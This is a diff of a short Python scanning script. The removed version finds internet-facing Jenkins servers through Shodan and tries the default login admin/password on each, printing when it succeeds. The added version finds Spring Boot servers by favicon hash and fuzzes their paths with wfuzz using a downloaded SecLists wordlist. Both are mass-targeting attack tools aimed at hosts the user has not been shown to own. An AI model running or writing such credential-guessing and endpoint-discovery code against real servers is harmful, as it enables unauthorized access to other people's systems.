@@ -1,10 +1,10 @@
+import requests
 import shodan
-import requests as rt
-import urllib3
+import wfuzz
 API_key_shodan = "ENTER_YOUR_SHODAN_API_KEY" #your shodan api key goes here
 api = shodan.Shodan(API_key_shodan)
-out_file = open('jenkins-instances.txt','a')
-query = 'x-jenkins'
+out_file = open('textFiles/spring-boot-server.txt','a')
+query = 'http.favicon.hash:116323821'
 try:
     results = api.search(query)
     print(f"Results found: {results['total']}")
@@ -22,17 +22,16 @@ try:
 except shodan.APIError as e:
     print(f"Error: {e}")
 
-    
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-urls = open("jenkins-instances.txt","r")
-data = {"j_username":"admin","j_password":"password"}
-endpoint = "/j_acegi_security_check"
-for url in urls.readlines():
-    url = url.strip("\n")
-    print("Testing- "+url)
+#fuzzing IP
+
+wordlist = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/WebContent/spring-boot.txt').text.split("\n")
+springs = open("textFiles/spring-boot-servers.txt","r")
+payloads = wfuzz.get_payload(wordlist)
+for spring in springs.readlines():
+    print("Fuzzing - "+spring)
     try:
-        req = rt.post(url=url+endpoint,data=data,verify=False)
-        if req.headers.get('location') and not "loginError" in req.headers["location"]:
-            print("login Success")
+        fuzzer = payloads.fuzz(url=spring.rstrip("\n")+"/FUZZ",sc=[200])
+        for result in fuzzer:
+            print(result)
     except:
         pass
